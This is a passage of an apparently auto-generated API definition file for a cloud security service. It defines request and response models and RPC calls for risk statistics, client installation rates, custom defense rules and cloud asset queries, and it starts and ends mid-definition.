      highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='43'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='29'),
      passCount?: int32(name='PassCount', description='The number of passed check items.', example='143'),
      sceneName?: string(name='SceneName', description='The name of the risk scenario.', example='SECURITY'),
      subStatistics?: [ 
        {
          alias?: string(name='Alias', description='The name of the baseline type.', example='weak_password'),
          highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='3'),
          lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='0'),
          mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='0'),
          passCount?: int32(name='PassCount', description='The number of passed check items.', example='2'),
          totalCount?: int32(name='TotalCount', description='The total number of check items.', example='5'),
          typeName?: string(name='TypeName', description='The baseline type.', example='weak_password'),
        }
      ](name='SubStatistics', description='The statistics on check items that are used in the risk scenario by baseline type.'),
      totalCount?: int32(name='TotalCount', description='The total number of check items.', example='219'),
    }
  ](name='Data', description='An array consisting of the statistics on check items that are used in risk scenarios.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C455672-2490-5211-84EC-420C7818****'),
}

model GetCheckRiskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckRiskStatisticsResponseBody(name='body'),
}

async function getCheckRiskStatistics(request: GetCheckRiskStatisticsRequest): GetCheckRiskStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckRiskStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckSaleRequest {
  regionId?: string(name='RegionId', example='cn-hangzhou', position='Query'),
}

model GetCheckSaleResponseBody = {
  checkSale?: {
    consumeCount?: long(name='ConsumeCount', example='500'),
    loyalUser?: boolean(name='LoyalUser', example='true'),
    purchaseCount?: long(name='PurchaseCount', example='1000'),
    saleUserType?: int32(name='SaleUserType', example='1'),
  }(name='CheckSale'),
  requestId?: string(name='RequestId', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCheckSaleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckSaleResponseBody(name='body'),
}

async function getCheckSale(request: GetCheckSaleRequest): GetCheckSaleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckSale', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckSummaryRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The account ID of the resource directory.', example='000', position='Query'),
}

model GetCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='843E4805-****-7EE12FA8DBFD'),
  summarys?: [ 
    {
      failCount?: int32(name='FailCount', description='The number of detected risk items.', example='5'),
      passCount?: long(name='PassCount', description='The number of check items that pass the check.', example='10'),
      standards?: [ 
        {
          failCount?: int32(name='FailCount', description='The number of risk items.', example='1'),
          id?: long(name='Id', description='The ID of the check item.', example='1'),
          passCount?: int32(name='PassCount', description='The number of check items that passed the check.', example='1'),
          riskLevelHighCount?: int32(name='RiskLevelHighCount', description='The number of **high-risk** items.', example='1'),
          riskLevelLowCount?: int32(name='RiskLevelLowCount', description='The number of **low-risk** items.', example='1'),
          riskLevelMediumCount?: int32(name='RiskLevelMediumCount', description='The number of **medium-risk** items.', example='1'),
          showName?: string(name='ShowName', description='The name of the check item.', example='Identity and permission management'),
        }
      ](name='Standards', description='The information about the check items.'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   **COMPLIANCE**: compliance
*   **RISK**: security risk
*   **IDENTITY_PERMISSION**: identity and permission', example='IDENTITY_PERMISSION'),
    }
  ](name='Summarys', description='An array that consists of the summary information about the configuration checks on cloud services.'),
}

model GetCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckSummaryResponseBody(name='body'),
}

async function getCheckSummary(request: GetCheckSummaryRequest): GetCheckSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckSummary', 'POST', '/', 'json', false, 'json', request);
}

model GetClientInstallationStatisticRequest {
  timeEnd: long(name='TimeEnd', description='The timestamp that specifies the end of the time range to collect statistics. Unit: millisecond.', example='1687708800000', position='Query'),
  timeStart: long(name='TimeStart', description='The timestamp that specifies the beginning of the time range to collect statistics. Unit: millisecond.', example='1687104000000', position='Query'),
}

model GetClientInstallationStatisticResponseBody = {
  clientInstallRatio?: {
    currentItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of cloud assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: millisecond.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='70.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of assets on which the client is installed.', example='70'),
          }
        ](name='Items', description='The current statistics on the installation rate of the client.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: a cloud asset provided by Alibaba Cloud.
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight cloud asset', example='7'),
      }
    ](name='CurrentItems', description='The current statistics on the installation rate of the client.'),
    dates?: [ long ](name='Dates', description='The time when statistics were collected.'),
    historyItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of cloud assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: millisecond.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='80.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of cloud assets on which the client is installed.', example='80'),
          }
        ](name='Items', description='The statistics on the client installation rate.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: a cloud asset provided by Alibaba Cloud.
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight cloud asset', example='4'),
      }
    ](name='HistoryItems', description='The historical statistics on the installation rate of the agent.'),
  }(name='ClientInstallRatio', description='The statistics on the client installation rate.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F62DD457-2588-589A-B1F6-A1245895D2AB'),
}

model GetClientInstallationStatisticResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientInstallationStatisticResponseBody(name='body'),
}

/**
  * @deprecated
  *
 */
// Deprecated
async function getClientInstallationStatistic(request: GetClientInstallationStatisticRequest): GetClientInstallationStatisticResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClientInstallationStatistic', 'POST', '/', 'json', false, 'json', request);
}

model GetClientRatioStatisticRequest {
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The ID of the primary account of the Resource Directory member account.
> call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) interface to obtain this parameter.', example='127608589417****', position='Query'),
  statisticTypes?: [ string ](name='StatisticTypes', description='An array that consists of the details of a statistical type.', position='Query'),
  timeEnd: long(name='TimeEnd', description='The timestamp that specifies the end of the time range to collect statistics. Unit: milliseconds.', example='1686412799999', position='Query'),
  timeStart: long(name='TimeStart', description='The timestamp that specifies the beginning of the time range to collect statistics. Unit: milliseconds.', example='1671382800000', position='Query'),
}

model GetClientRatioStatisticResponseBody = {
  clientInstallRatio?: {
    currentItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='70.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of assets on which the client is installed.', example='70'),
          }
        ](name='Items', description='The list of the statistics on the installation rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      }
    ](name='CurrentItems', description='The list of current statistics on the installation rate of the client.'),
    historyItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='80.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of assets on which the client is installed.', example='80'),
          }
        ](name='Items', description='The list of statistics on the client installation rate.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a simple application server', example='3'),
      }
    ](name='HistoryItems', description='The list of historical statistics on the installation rate of the client.'),
  }(name='ClientInstallRatio', description='The statistics on the client installation rate.'),
  clientOnlineRatio?: {
    currentItems?: [ 
      {
        items?: [ 
          {
            assetInstallCount?: int32(name='AssetInstallCount', description='The number of assets on which the client is installed.', example='50'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            onlineAssetCount?: int32(name='OnlineAssetCount', description='The number of online assets.', example='10'),
            onlineRatio?: double(name='OnlineRatio', description='The online rate. Unit: %.', example='20.00'),
          }
        ](name='Items', description='The list of current statistics on the online rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a simple application server', example='3'),
      }
    ](name='CurrentItems', description='The list of current statistics on the online rate of the client.'),
    historyItems?: [ 
      {
        items?: [ 
          {
            assetInstallCount?: int32(name='AssetInstallCount', description='The number of assets on which the client is installed.', example='50'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            onlineAssetCount?: int32(name='OnlineAssetCount', description='The number of online assets.', example='20'),
            onlineRatio?: double(name='OnlineRatio', description='The online rate. Unit: %.', example='40.00'),
          }
        ](name='Items', description='The list of historical statistics on the online rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='7'),
      }
    ](name='HistoryItems', description='The list of historical statistics on the online rate of the client.'),
  }(name='ClientOnlineRatio', description='The statistics on the client online rate.'),
  dates?: [ long ](name='Dates', description='The list of time when statistics were collected.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model GetClientRatioStatisticResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientRatioStatisticResponseBody(name='body'),
}

async function getClientRatioStatistic(request: GetClientRatioStatisticRequest): GetClientRatioStatisticResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClientRatioStatistic', 'POST', '/', 'json', false, 'json', request);
}

model GetClientUserDefineRuleRequest {
  id: long(name='Id', description='The ID of the custom defense rule.', example='200****', position='Query'),
}

model GetClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  userDefineRuleDetail?: {
    actionType?: string(name='ActionType', description='The action of the custom defense rule. Valid values:

*   **0**: allow
*   **1**: block', example='0'),
    cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****'),
    filePath?: string(name='FilePath', description='The file path.', example='/etc/pam****'),
    gmtCreate?: long(name='GmtCreate', description='The time when the custom defense rule was created.', example='167118088****'),
    gmtModified?: long(name='GmtModified', description='The time when the custom defense rule was last modified.', example='167118088****'),
    ip?: string(name='IP', description='The IP address.', example='10.240.XX.XX'),
    id?: long(name='Id', description='The ID of the custom defense rule.', example='200****'),
    md5List?: string(name='Md5List', description='The hash values of processes.', example='0c9045b5bec90f9825f1f3f64dd4****'),
    name?: string(name='Name', description='The name of the custom defense rule.', example='Rule\\*\\*\\*\\*'),
    newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****'),
    parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****'),
    parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='c:/windows/system32/i****'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **linux**
*   **windows**
*   **all**', example='linux'),
    port?: int32(name='Port', description='The port number.', example='22'),
    portStr?: string(name='PortStr', description='The port number. Valid values: 1 to 65535.', example='80'),
    procPath?: string(name='ProcPath', description='The path to the process.', example='c:/windows/system32/i****'),
    registryContent?: string(name='RegistryContent', description='The registry value.', example='*SECOH-QAD.exe*'),
    registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****'),
    type?: int32(name='Type', description='The type of the custom defense rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1'),
  }(name='UserDefineRuleDetail', description='The information about the custom defense rule.'),
}

model GetClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientUserDefineRuleResponseBody(name='body'),
}

async function getClientUserDefineRule(request: GetClientUserDefineRuleRequest): GetClientUserDefineRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClientUserDefineRule', 'POST', '/', 'json', false, 'json', request);
}

model GetCloudAssetCriteriaRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service or asset. Valid values:

*   **0**: ECS

    *   **0**: instance
    *   **1**: disk (storage)
    *   **2**: security group

*   **1**: SLB

    *   **0**: SLB
    *   **1**: Application Load Balancer (ALB)

*   **3**: ApsaraDB RDS

    *   **0**: instance

*   **4**: MongoDB

    *   **0**: instance

*   **5**: Redis

    *   **0**: instance

*   **6**: Container Registry

    *   **1**: Enterprise Edition
    *   **2**: Personal Edition

*   **8**: ACK

    *   **0**: cluster

*   **9**: VPC

    *   **0**: NAT gateway
    *   **1**: Elastic IP address (EIP)
    *   **2**: VPN
    *   **3**: VPC Flow Logs

*   **11**: ActionTrail

    *   **0**: trail

*   **12**: CDN

    *   **0**: instance

*   **13**: Certificate Management Service (formerly SSL Certificates Service)

    *   **0**: certificate

*   **14**: Apsara Devops

    *   **0**: organization

*   **16**: Anti-DDoS

    *   **0**: instance

*   **17**: WAF

    *   **0**: domain name

*   **18**: OSS

    *   **0**: bucket

*   **19**: PolarDB

    *   **0**: cluster

*   **20**: ApsaraDB RDS for PostgreSQL

    *   **0**: instance

*   **21**: MSE

    *   **0**: cluster

*   **22**: NAS

    *   **0**: file system

*   **23**: DSC

    *   **0**: instance

*   **24**: EIP

    *   **0**: Anycast EIP

*   **25**: IDaaS EIAM

    *   **0**: instance

*   **26**: PolarDB-X

    *   **0**: instance

*   **27**: Elasticsearch

    *   **0**: instance', example='2'),
      assetType?: int32(name='AssetType', description='The type of the asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='9'),
    }
  ](name='CloudAssetTypes', description='The types of cloud assets.', position='Query'),
  value?: string(name='Value', description='The keyword for fuzzy search when you query the asset.', example='testwww', position='Query'),
}

model GetCloudAssetCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', description='The structured attribute values of the assets that match the keyword. The value of this parameter is in the JSON format and contains the following fields:

*   **vendor**: providers
*   **regionIds**: IDs of supported regions', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', description='The name of the filter condition. Valid values:

*   **instanceId**: the ID of the instance
*   **instanceName**: the name of an instance
*   **internetIp**: the public IP address
*   **riskStatus**: the risk status
*   **vendorRegionId**: the region ID by service provider', example='instanceId'),
      type?: string(name='Type', description='The type of the filter condition. Valid values:

*   **input**: The filter condition needs to be specified.
*   **select**: The filter condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

>  If the value of **Type** is **input**, the value of this parameter is an empty string.', example='fvt*'),
    }
  ](name='CriteriaList', description='An array consisting of the information about the filter conditions that are used to search for cloud assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model GetCloudAssetCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetCriteriaResponseBody(name='body'),
}

async function getCloudAssetCriteria(request: GetCloudAssetCriteriaRequest): GetCloudAssetCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCloudAssetCriteria', 'POST', '/', 'json', false, 'json', request);
}

model GetCloudAssetDetailRequest {
  assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0', position='Query'),
  assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS).
*   **1**: Server Load Balancer (SLB).
*   **3**: ApsaraDB RDS.
*   **4**: ApsaraDB for MongoDB.
*   **5**: ApsaraDB for Redis.
*   **6**: Container Registry.
*   **8**: Container Service for Kubernetes.
*   **9**: Virtual Private Cloud (VPC).
*   **11**: ActionTrail.
*   **12**: Alibaba Cloud CDN (CDN).
*   **13**: Certificate Management Service.
*   **14**: Apsara Devops.
*   **15**: Resource Access Management (RAM).
*   **16**: Anti-DDoS.
*   **17**: Web Application Firewall (WAF).
*   **18**: Object Storage Service (OSS).
*   **19**: PolarDB.
*   **20**: ApsaraDB RDS for PostgreSQL.
*   **21**: Microservices Engine (MSE).
*   **22**: Apsara File Storage NAS (NAS).
*   **23**: Data Security Center (DSC).
*   **24**: Elastic IP Address (EIP).
*   **25**: Identity as a Service (IDaaS)-Employee Identity and Access Management (EIAM).
*   **26**: PolarDB-X.
*   **27**: Elasticsearch.', example='14', position='Query'),
  cloudAssetInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='sg-wz9hf86vbzbrrde7****'),
      regionId?: string(name='RegionId', description='The region in which the cloud asset resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
    }
  ](name='CloudAssetInstances', description='The details of the assets.', position='Query'),
  vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: Alibaba Cloud.
*   **1**: service provider that is unrecognized.
*   **2**: data center.
*   **3**, **4**, **5**, and **7**: third-party service provider.
*   **8**: simple application server.', example='0', position='Query'),
}

model GetCloudAssetDetailResponseBody = {
  count?: int32(name='Count', description='The number of instances in the list of cloud assets returned.', example='1'),
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The name of the cloud asset subtype.', example='INSTANCE'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: ECS.
*   **1**: SLB.
*   **3**: ApsaraDB RDS.
*   **4**: ApsaraDB for MongoDB.
*   **5**: ApsaraDB for Redis.
*   **6**: Container Registry.
*   **8**: Container Service for Kubernetes.
*   **9**: VPC.
*   **11**: ActionTrail.
*   **12**: CDN.
*   **13**: Certificate Management Service.
*   **14**: Apsara Devops.
*   **15**: RAM.
*   **16**: Anti-DDoS.
*   **17**: WAF.
*   **18**: OSS.
*   **19**: PolarDB.
*   **20**: ApsaraDB RDS for PostgreSQL.
*   **21**: MSE.
*   **22**: NAS.
*   **23**: DSC.
*   **24**: EIP.
*   **25**: IDaaS-EIAM.
*   **26**: PolarDB-X.
*   **27**: Elasticsearch.', example='3'),
      assetTypeName?: string(name='AssetTypeName', description='The name of the cloud asset type.', example='RDS'),
      createdTime?: long(name='CreatedTime', description='The time when the instance was created. The value is a timestamp.', example='1607365213000'),
      detailLink?: string(name='DetailLink', description='The detailed address of the cloud asset.', example='https://rdsnext.console.aliyun.com/detail/rm-uf6t6u05n6g48****/basicInfo?region=cn-shanghai'),
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='rm-uf6t6u05n6g48****'),
      instanceName?: string(name='InstanceName', description='The instance name of the cloud asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the instance.', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The region in which the cloud asset resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      securityInfo?: string(name='SecurityInfo', description='The security information about the cloud asset.', example='{\\"seriousNum\\":0,\\"appNum\\":0,\\"baselineMedium\\":0,\\"remindNum\\":0,\\"imageVulNntf\\":0,\\"cveNum\\":0,\\"vul\\":0,\\"uuid\\":\\"rm-uf6t6u05n6g485o70\\",\\"emgNum\\":0,\\"weakPWNum\\":0,\\"imageMaliciousFileRemind\\":0,\\"imageBaselineMedium\\":0,\\"laterVulCount\\":0,\\"cmsNum\\":0,\\"imageMaliciousFileSerious\\":0,\\"agentlessMalicious\\":0,\\"suspNum\\":0,\\"imageBaselineHigh\\":0,\\"asapVulCount\\":0,\\"imageVulLater\\":0,\\"agentlessAll\\":0,\\"sysNum\\":0,\\"containerLater\\":0,\\"containerSuspicious\\":0,\\"imageBaselineNum\\":0,\\"newSuspicious\\":0,\\"nntfVulCount\\":0,\\"scaNum\\":0,\\"containerNntf\\":0,\\"health\\":0,\\"trojan\\":0,\\"suspicious\\":0,\\"imageMaliciousFileSuspicious\\":0,\\"containerRemind\\":0,\\"baselineLow\\":0,\\"imageVulAsap\\":0,\\"imageBaselineLow\\":0,\\"containerAsap\\":0,\\"agentlessBaseline\\":0,\\"agentlessVulSca\\":0,\\"agentlessVulCve\\":0,\\"containerSerious\\":0,\\"baselineHigh\\":0,\\"account\\":0,\\"baselineNum\\":6}'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: Alibaba Cloud.
*   **1**: service provider that is unrecognized.
*   **2**: data center.
*   **3**, **4**, **5**, and **7**: third-party service provider.
*   **8**: simple application server.', example='0'),
    }
  ](name='Instances', description='An array that consists of the details of the cloud assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CB45CAED-31C3-517A-8619-10F632D3****'),
}

model GetCloudAssetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetDetailResponseBody(name='body'),
}

async function getCloudAssetDetail(request: GetCloudAssetDetailRequest): GetCloudAssetDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCloudAssetDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetCloudAssetSummaryRequest {
}

model GetCloudAssetSummaryResponseBody = {
  groupedFields?: {
    cloudAssetSummaryMetas?: [ 
      {
        assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0'),
        assetType?: int32(name='AssetType', description='The type of the cloud service. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: Identity as a Service (IDaaS) - Enterprise Identity Access Management (EIAM)
*   **26**: PolarDB for Xscale (PolarDB-X)
*   **27**: Elasticsearch', example='16'),
        instanceCount?: int32(name='InstanceCount', description='The total number of cloud service instances of this type.', example='16'),
        instanceRiskCount?: int32(name='InstanceRiskCount', description='The total number of cloud service instances that are at risk of this type.', example='5'),
        vendor?: int32(name='Vendor'),
      }
    ](name='CloudAssetSummaryMetas', description='The statistics of cloud services.'),
    instanceCountTotal?: int32(name='InstanceCountTotal', example='919'),
    instanceRiskCountTotal?: int32(name='InstanceRiskCountTotal', example='544'),
  }(name='GroupedFields', description='The summary of cloud services.'),
  requestId?: string(name='RequestId', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCloudAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetSummaryResponseBody(name='body'),
}

async function getCloudAssetSummary(request: GetCloudAssetSummaryRequest): GetCloudAssetSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCloudAssetSummary', 'POST', '/', 'json', false, 'json', request);
}

model GetClusterCheckItemWarningStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='cd49575861a3044d49c954e4b3911****', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='e4af3620-6895-4e2f-a641-a9d8fb53****', position='Query'),
}

model GetClusterCheckItemWarningStatisticsResponseBody = {
  data?: {
    highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='3'),
    lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='1'),
    mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='2'),
  }(name='Data', description='The statistics on risk items by risk level.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2B285A3-3493-5C5F-A224-4CCE4BFC****'),
}

model GetClusterCheckItemWarningStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterCheckItemWarningStatisticsResponseBody(name='body'),
}

async function getClusterCheckItemWarningStatistics(request: GetClusterCheckItemWarningStatisticsRequest): GetClusterCheckItemWarningStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClusterCheckItemWarningStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetClusterRuleSummaryRequest {
  clusterId: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cc49d88d1exxx', position='Query'),
}

model GetClusterRuleSummaryResponseBody = {
  clusterRuleSummary?: {
    closeRuleCount?: int32(name='CloseRuleCount', description='The number of disabled cluster defense rules.', example='1'),
    interceptionCount7Day?: long(name='InterceptionCount7Day', description='The number of alerts that are triggered by the cluster defense rules in the last seven days.', example='10'),
    interceptionSwitch?: int32(name='InterceptionSwitch', description='The status of the container firewall feature. Valid values:

*   **0**: disabled
*   **1**: enabled', example='0'),
    interceptionType?: int32(name='InterceptionType', description='The interception mode.', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', description='The number of enabled cluster defense rules.', example='1'),
    ruleCount?: int32(name='RuleCount', description='The total number of configured cluster defense rules.', example='10'),
    suggestRuleCount?: int32(name='SuggestRuleCount', description='The number of recommended cluster defense rules.', example='1'),
  }(name='ClusterRuleSummary', description='The overall information about the cluster defense rules.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-xxx'),
}

model GetClusterRuleSummaryResponse = {
